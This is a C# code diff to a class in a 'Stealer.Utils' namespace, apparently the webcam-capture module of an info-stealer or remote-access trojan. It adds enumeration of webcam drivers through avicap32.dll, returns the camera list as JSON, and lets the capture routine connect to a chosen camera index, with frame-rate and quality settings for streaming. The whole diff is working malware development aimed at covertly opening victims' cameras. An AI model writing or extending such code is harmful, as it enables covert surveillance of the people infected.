@@ -22,6 +22,15 @@ namespace Stealer.Utils
             IntPtr hWndParent,
             int nID);
 
+        // capGetDriverDescriptionA via avicap32.dll
+        [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi)]
+        private static extern bool capGetDriverDescriptionA(
+            ushort wDriverIndex,
+            [Out] byte[] lpszName,
+            int cbName,
+            [Out] byte[] lpszVer,
+            int cbVer);
+
         [DllImport("user32.dll")]
         private static extern bool DestroyWindow(IntPtr hWnd);
 
@@ -48,6 +57,32 @@ namespace Stealer.Utils
         private const uint CF_BITMAP = 2;
 
         private static int _selectedCamIndex = 0;
+
+        public static string GetCameraListJson()
+        {
+            var list = new System.Collections.Generic.List<string>();
+            byte[] nameBuf = new byte[256];
+            byte[] verBuf = new byte[256];
+
+            for (ushort i = 0; i < 10; i++)
+            {
+                Array.Clear(nameBuf, 0, nameBuf.Length);
+                Array.Clear(verBuf, 0, verBuf.Length);
+
+                if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
+                {
+                    string name = System.Text.Encoding.ASCII.GetString(nameBuf).TrimEnd('\0', ' ', '\r', '\n');
+                    if (!string.IsNullOrEmpty(name))
+                    {
+                        // Escape quotes for JSON
+                        name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                        list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
+                    }
+                }
+            }
+
+            return "[" + string.Join(",", list.ToArray()) + "]";
+        }
 
         public static void Start(int fps, int quality, int camIndex = 0)
         {
@@ -78,16 +113,16 @@ namespace Stealer.Utils
                     return;
                 }
 
-                // Automatically detect active camera hardware (try index 0..9)
-                IntPtr connected = IntPtr.Zero;
-                int foundIndex = -1;
-                for (int i = 0; i < 10; i++)
+                // Connect to chosen camera index
+                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedCamIndex, IntPtr.Zero);
+                if (connected == IntPtr.Zero)
                 {
-                    connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
-                    if (connected != IntPtr.Zero)
+                    // Fallback to any active driver 0..9
+                    for (int i = 0; i < 10; i++)
                     {
-                        foundIndex = i;
-                        break;
+                        if (i == _selectedCamIndex) continue;
+                        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
+                        if (connected != IntPtr.Zero) break;
                     }
                 }
 
